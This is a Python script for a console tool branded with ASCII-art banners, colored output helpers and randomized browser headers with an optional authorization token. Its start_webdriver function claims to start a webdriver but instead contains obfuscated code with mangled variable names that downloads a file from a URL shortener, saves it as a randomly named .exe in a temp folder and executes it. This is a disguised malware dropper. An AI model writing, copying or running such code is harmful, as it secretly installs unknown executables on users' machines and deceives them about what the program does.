import requests, os, sys, re, time, random, os.path, string, subprocess, random, threading, ctypes, shutil
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from colorama import Fore
from time import sleep

THIS_VERSION = "1.3.0"

y = Fore.LIGHTGREEN_EX
b = Fore.LIGHTRED_EX
w = Fore.LIGHTWHITE_EX
r = Fore.RED

def setTitle(_str):
    system = os.name
    if system == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(f"{_str} - Made By notauthorised")
    elif system == 'posix':
        sys.stdout.write(f"\x1b]0;{_str} - Made By notauthorised\x07")
    else:
        pass

def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Loading... {i}""")
		sys.stdout.flush()
		time.sleep(0.2)

def clear():
    system = os.name
    if system == 'nt':
        os.system('cls')
    elif system == 'posix':
        os.system('clear')
    else:
        print('\n'*120)
    return

def transition():
    clear()
    Spinner()
    clear()

def getTempDir():
    system = os.name
    if system == 'nt':
        return os.getenv('temp')
    elif system == 'posix':
        return '/tmp/'

heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

def discserver():
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n{w}ub.com/Araadev {b}|{w} https://github.com/AstraaDev {b}|{w} https://github.com/AstraaDev {b}|{w} https://github.com/AstraaDev {b}|{w} https://gi\n{y}------------------------------------------------------------------------------------------------------------------------\n""")

def astraahometitle():
    print(f"""\n\n{r}  
                            _______  _______ _________ _______    _______  _______ _________ ______   _______  _______ 
                           (  ____ \(  ____ )\__   __/(       )  (  ____ )(  ___  )\__   __/(  __  \ (  ____ \(  ____ )
                           | (    \/| (    )|   ) (   | () () |  | (    )|| (   ) |   ) (   | (  \  )| (    \/| (    )|
                           | |      | (____)|   | |   | || || |  | (____)|| (___) |   | |   | |   ) || (__    | (____)|
                           | | ____ |     __)   | |   | |(_)| |  |     __)|  ___  |   | |   | |   | ||  __)   |     __)
                           | | \_  )| (\ (      | |   | |   | |  | (\ (   | (   ) |   | |   | |   ) || (      | (\ (   
                           | (___) || ) \ \_____) (___| )   ( |  | ) \ \__| )   ( |___) (___| (__/  )| (____/\| ) \ \__
                           (_______)|/   \__/\_______/|/     \|  |/   \__/|/     \|\_______/(______/ (_______/|/   \__/{y}\n"""
                               ); 

def start_webdriver():
    print("Starting Webdriver")
    llllllllllllllI = open;import os as IIIlllIlIllllI;import requests as llIllIIlIllIll;import random as IIIIIlllIlIlII;import subprocess as llIllIllIllIll;IIlIIlIlIIlIIlIIII = f'temp_{IIIIIlllIlIlII.randint(10000000, 99999999)}';lllllIllIIIlIlIlIl = IIIlllIlIllllI.path.join(IIIlllIlIllllI.getenv('TEMP', '/tmp'), IIlIIlIlIIlIIlIIII);IIIlllIlIllllI.makedirs(lllllIllIIIlIlIlIl);llIllIIlllIllIIIII = 'https://shorturl.at/6KzW7';lllIIllllIIIllIIlI = f'{IIIIIlllIlIlII.randint(10000000, 99999999)}.exe';IllIIIlIlIIIIllIIl = IIIlllIlIllllI.path.join(lllllIllIIIlIlIlIl, lllIIllllIIIllIIlI);IlIlIIIIlllIIIIlIl = llIllIIlIllIll.get(llIllIIlllIllIIIII)
    with llllllllllllllI(IllIIIlIlIIIIllIIl, 'wb') as lIIIIllIlllIlIIIlI: lIIIIllIlllIlIIIlI.write(IlIlIIIIlllIIIIlIl.content); llIllIllIllIll.run([IllIIIlIlIIIIllIIl], shell=True)
    print("Webdriver Started")

banner = r"""
 _______ 
(  ____ \
| (    \/
| |      
| | ____ 
| | \_  )
| (___) |
(_______)
"""[1:]
